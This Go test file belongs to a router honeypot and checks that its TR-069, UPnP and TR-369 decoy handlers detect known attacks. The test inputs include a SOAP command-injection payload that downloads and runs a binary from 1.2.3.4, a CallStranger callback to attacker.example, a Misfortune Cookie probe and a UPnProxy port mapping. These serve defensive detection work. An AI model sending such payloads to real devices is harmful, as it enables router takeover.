package handler

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/config"
)

// runCPE drives a TCP handler over a net.Pipe with the given request bytes and
// returns the Result plus whatever the handler wrote back. The request is
// written concurrently (net.Pipe is synchronous) and the response is read
// before the handler returns (its Write blocks until we read).
func runCPE(t *testing.T, h Handler, req string, readTimeout time.Duration) (Result, string) {
	t.Helper()
	client, server := pipePair(t)
	cfg := config.Listener{ReadTimeout: readTimeout, ReadBytes: 16384}
	done := make(chan Result, 1)
	go func() {
		r, _ := h.Handle(context.Background(), server, cfg)
		done <- r
	}()
	go func() { _, _ = client.Write([]byte(req)) }()
	_ = client.SetReadDeadline(time.Now().Add(readTimeout + time.Second))
	buf := make([]byte, 16384)
	n, _ := client.Read(buf)
	res := <-done
	return res, string(buf[:n])
}

func hasCVE(res Result, id string) bool {
	for _, c := range res.CVEHits {
		if c == id {
			return true
		}
	}
	return false
}

// --- TR-069 (CWMP) ---------------------------------------------------------

func TestTR069ConnectionRequest401(t *testing.T) {
	res, resp := runCPE(t, &tr069{}, "GET / HTTP/1.1\r\nHost: 10.0.0.1:7547\r\nUser-Agent: masscan\r\n\r\n", time.Second)
	if !strings.Contains(resp, "401 Unauthorized") || !strings.Contains(resp, "RomPager") {
		t.Errorf("expected RomPager 401 decoy, got: %q", resp)
	}
	if !strings.Contains(resp, "WWW-Authenticate: Digest") {
		t.Errorf("expected Digest challenge, got: %q", resp)
	}
	if !hasAnom(res, "tr069-connection-request") {
		t.Errorf("missing connection-request anomaly: %v", anomaliesOf(res))
	}
	if intent, _ := res.Meta["intent"].(string); !strings.Contains(intent, "TR-069") {
		t.Errorf("intent not set: %q", res.Meta["intent"])
	}
	if cwe, _ := res.Meta["cwe"].(string); !strings.Contains(cwe, "CWE-306") {
		t.Errorf("missing CWE-306: %q", res.Meta["cwe"])
	}
}

func TestTR069SetNTPServersCommandInjection(t *testing.T) {
	body := `<?xml version="1.0"?><soap:Envelope><soap:Body>` +
		`<u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">` +
		"<NewNTPServer1>`cd /tmp; wget http://1.2.3.4/x; chmod 777 x; ./x`</NewNTPServer1>" +
		`</u:SetNTPServers></soap:Body></soap:Envelope>`
	req := "POST /UD/act?1 HTTP/1.1\r\nHost: x\r\n" +
		"SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\n" +
		"Content-Length: " + itoa(len(body)) + "\r\n\r\n" + body
	res, resp := runCPE(t, &tr069{}, req, time.Second)
	if !hasAnom(res, "tr069-command-injection") {
		t.Errorf("command injection not flagged: %v", anomaliesOf(res))
	}
	if !hasCVE(res, "CVE-2016-10372") {
		t.Errorf("CVE-2016-10372 not detected: %v", res.CVEHits)
	}
	if cwe, _ := res.Meta["cwe"].(string); !strings.Contains(cwe, "CWE-78") {
		t.Errorf("missing CWE-78: %q", res.Meta["cwe"])
	}
	if intent, _ := res.Meta["intent"].(string); !strings.Contains(intent, "command injection") {
		t.Errorf("intent wrong: %q", res.Meta["intent"])
	}
	if res.Meta["soap_action"] != "SetNTPServers" {
		t.Errorf("soap_action = %v; want SetNTPServers", res.Meta["soap_action"])
	}
	_ = resp
}

func TestTR069MisfortuneCookie(t *testing.T) {
	req := "GET / HTTP/1.1\r\nHost: x\r\nCookie: C107239=AAAAAAAAAAAAAAAAAAAA\r\n\r\n"
	res, _ := runCPE(t, &tr069{}, req, time.Second)
	if !hasAnom(res, "tr069-misfortune-cookie") {
		t.Errorf("misfortune cookie not flagged: %v", anomaliesOf(res))
	}
	if !hasCVE(res, "CVE-2014-9222") {
		t.Errorf("CVE-2014-9222 not detected: %v", res.CVEHits)
	}
	if cwe, _ := res.Meta["cwe"].(string); !strings.Contains(cwe, "CWE-787") {
		t.Errorf("missing CWE-787: %q", res.Meta["cwe"])
	}
}

func TestTR069InformDecoy(t *testing.T) {
	body := `<soap:Envelope xmlns:cwmp="urn:dslforum-org:cwmp-1-0"><soap:Body><cwmp:Inform>` +
		`<DeviceId><Manufacturer>Zyxel</Manufacturer><OUI>0019CB</OUI>` +
		`<ProductClass>VMG1312</ProductClass><SerialNumber>S123</SerialNumber></DeviceId>` +
		`</cwmp:Inform></soap:Body></soap:Envelope>`
	req := "POST /cwmp HTTP/1.1\r\nHost: x\r\nContent-Length: " + itoa(len(body)) + "\r\n\r\n" + body
	res, resp := runCPE(t, &tr069{}, req, time.Second)
	if res.Meta["cwmp_method"] != "Inform" {
		t.Errorf("cwmp_method = %v; want Inform", res.Meta["cwmp_method"])
	}
	if res.Meta["cwmp_serial"] != "S123" || res.Meta["cwmp_oui"] != "0019CB" {
		t.Errorf("device identity not captured: %+v", res.Meta)
	}
	if !strings.Contains(resp, "InformResponse") {
		t.Errorf("expected InformResponse decoy, got: %q", resp)
	}
}

// --- UPnP IGD --------------------------------------------------------------

func TestUPnPCallStranger(t *testing.T) {
	req := "SUBSCRIBE /evt/IPConn HTTP/1.1\r\nHost: 10.0.0.1\r\n" +
		"CALLBACK: <http://attacker.example/steal>\r\nNT: upnp:event\r\nTIMEOUT: Second-1800\r\n\r\n"
	res, resp := runCPE(t, &upnp{}, req, time.Second)
	if !hasAnom(res, "upnp-callstranger") {
		t.Errorf("callstranger not flagged: %v", anomaliesOf(res))
	}
	if !hasCVE(res, "CVE-2020-12695") {
		t.Errorf("CVE-2020-12695 not detected: %v", res.CVEHits)
	}
	if cwe, _ := res.Meta["cwe"].(string); !strings.Contains(cwe, "CWE-918") {
		t.Errorf("missing CWE-918 (SSRF): %q", res.Meta["cwe"])
	}
	if !strings.Contains(resp, "200 OK") || !strings.Contains(resp, "SID:") {
		t.Errorf("expected GENA 200 with SID, got: %q", resp)
	}
}

func TestUPnPAddPortMappingUPnProxy(t *testing.T) {
	body := `<?xml version="1.0"?><s:Envelope><s:Body>` +
		`<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">` +
		`<NewProtocol>TCP</NewProtocol><NewExternalPort>1337</NewExternalPort>` +
		`<NewInternalClient>8.8.8.8</NewInternalClient><NewInternalPort>25</NewInternalPort>` +
		`</u:AddPortMapping></s:Body></s:Envelope>`
	req := "POST /ctl/IPConn HTTP/1.1\r\nHost: x\r\n" +
		"SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"\r\n" +
		"Content-Length: " + itoa(len(body)) + "\r\n\r\n" + body
	res, resp := runCPE(t, &upnp{}, req, time.Second)
	if !hasAnom(res, "upnp-addportmapping") {
		t.Errorf("AddPortMapping not flagged: %v", anomaliesOf(res))
	}
	if cwe, _ := res.Meta["cwe"].(string); !strings.Contains(cwe, "CWE-441") {
		t.Errorf("missing CWE-441 (UPnProxy): %q", res.Meta["cwe"])
	}
	if pm, _ := res.Meta["upnp_port_mapping"].(string); !strings.Contains(pm, "InternalClient=8.8.8.8") {
		t.Errorf("port mapping not summarized: %q", pm)
	}
	if intent, _ := res.Meta["intent"].(string); !strings.Contains(intent, "UPnProxy") {
		t.Errorf("intent wrong: %q", res.Meta["intent"])
	}
	if !strings.Contains(resp, "200 OK") {
		t.Errorf("expected SOAP 200, got: %q", resp)
	}
}

func TestUPnPRootDescDecoy(t *testing.T) {
	res, resp := runCPE(t, &upnp{}, "GET /rootDesc.xml HTTP/1.1\r\nHost: x\r\n\r\n", time.Second)
	if !hasAnom(res, "upnp-device-description") {
		t.Errorf("device-description not flagged: %v", anomaliesOf(res))
	}
	if !strings.Contains(resp, "InternetGatewayDevice") || !strings.Contains(resp, "WANIPConnection") {
		t.Errorf("expected IGD rootDesc decoy, got: %q", resp)
	}
}

func TestUPnPRealtekCommandInjection(t *testing.T) {
	// Realtek miniigd NewInternalClient (CVE-2014-8361), matched via the http
	// service the upnp handler additionally scans.
	body := `<u:AddPortMapping><NewInternalClient>192.168.1.1</NewInternalClient></u:AddPortMapping>` +
		`<picsdesc.xml>`
	req := "POST /picsdesc.xml HTTP/1.1\r\nHost: x\r\nContent-Length: " + itoa(len(body)) + "\r\n\r\n" + body
	res, _ := runCPE(t, &upnp{}, req, time.Second)
	if !hasCVE(res, "CVE-2014-8361") {
		t.Errorf("Realtek CVE-2014-8361 not detected via http scan: %v", res.CVEHits)
	}
	if !hasAnom(res, "upnp-command-injection") {
		t.Errorf("upnp command injection not flagged: %v", anomaliesOf(res))
	}
}

// --- TR-369 (USP) ----------------------------------------------------------

func TestTR369WebSocketUSPHandshake(t *testing.T) {
	req := "GET /usp HTTP/1.1\r\nHost: 10.0.0.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n" +
		"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n" +
		"Sec-WebSocket-Protocol: v1.usp\r\n\r\n"
	res, resp := runCPE(t, &tr369{}, req, time.Second)
	if !strings.Contains(resp, "101 Switching Protocols") {
		t.Errorf("expected WS 101 decoy, got: %q", resp)
	}
	if !strings.Contains(resp, "Sec-WebSocket-Protocol: v1.usp") {
		t.Errorf("expected v1.usp echoed, got: %q", resp)
	}
	if !hasAnom(res, "usp-websocket-mtp") || !hasAnom(res, "usp-cleartext-mtp") {
		t.Errorf("usp MTP anomalies missing: %v", anomaliesOf(res))
	}
	if cwe, _ := res.Meta["cwe"].(string); !strings.Contains(cwe, "CWE-319") {
		t.Errorf("missing CWE-319 (cleartext MTP): %q", res.Meta["cwe"])
	}
	if intent, _ := res.Meta["intent"].(string); !strings.Contains(intent, "v1.usp") {
		t.Errorf("intent wrong: %q", res.Meta["intent"])
	}
}

func TestTR369RawRecordEndpoints(t *testing.T) {
	// A USP Record-ish blob with the version field and endpoint IDs.
	raw := "\x0a\x031.3\x12\x14proto::acs-controller-1\x1a\x10os::0019CB-000001"
	res, _ := runCPE(t, &tr369{}, raw, 400*time.Millisecond)
	if res.Meta["usp_mtp"] != "binary" {
		t.Errorf("usp_mtp = %v; want binary", res.Meta["usp_mtp"])
	}
	eps, _ := res.Meta["usp_endpoints"].([]string)
	if len(eps) == 0 {
		t.Fatalf("no usp endpoints captured: %+v", res.Meta)
	}
	var foundProto, foundOS bool
	for _, e := range eps {
		if strings.HasPrefix(e, "proto::") {
			foundProto = true
		}
		if strings.HasPrefix(e, "os::") {
			foundOS = true
		}
	}
	if !foundProto || !foundOS {
		t.Errorf("endpoint IDs not extracted: %v", eps)
	}
	if res.Meta["usp_version"] != "1.3" {
		t.Errorf("usp_version = %v; want 1.3", res.Meta["usp_version"])
	}
	if !hasAnom(res, "usp-agent-access") {
		t.Errorf("usp-agent-access missing: %v", anomaliesOf(res))
	}
}
